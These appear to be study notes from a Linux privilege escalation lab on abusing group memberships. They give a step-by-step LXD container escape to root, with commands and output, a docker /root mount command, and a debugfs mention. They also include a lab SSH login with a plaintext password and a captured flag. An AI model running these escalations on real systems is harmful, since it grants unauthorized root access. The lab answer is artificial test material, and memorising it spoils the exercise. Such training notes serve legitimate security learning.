# Privileged Groups

## LXC / LXD

LXD is similar to Docker and is Ubuntu's container manager. 

Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root.

id
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)

## Exploitation

1)
unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/

2)
lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge

3)
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b

4)
lxc init alpine r00t -c security.privileged=true

Creating r00t

5)
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t

6)
lxc start r00t
lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 

## Docker

docker run -v /root:/mnt -it ubuntu

## Disk

Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1

An attacker with these privileges can use debugfs to access the entire file system with root level privileges.

## ADM

Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

id
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)

## LAB

ssh secaudit@10.129.181.58
Academy_LLPE!

id
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)

grep -Rnw '/var/log/' -e 'HTB{.*}'
grep: /var/log/btmp: Permission denied
grep: /var/log/installer/cdebconf/questions.dat: Permission denied
grep: /var/log/installer/cdebconf/templates.dat: Permission denied
grep: /var/log/installer/partman: Permission denied
grep: /var/log/installer/syslog: Permission denied


grep -Rnw '/var/log/' -e 'flag'

grep: /var/log/btmp: Permission denied
grep: /var/log/installer/cdebconf/questions.dat: Permission denied
grep: /var/log/installer/cdebconf/templates.dat: Permission denied
grep: /var/log/installer/partman: Permission denied
grep: /var/log/installer/syslog: Permission denied
/var/log/apache2/access.log:127:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps! HTTP/1.1" 301 409 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
/var/log/apache2/access.log:128:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps HTTP/1.1" 404 27847 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
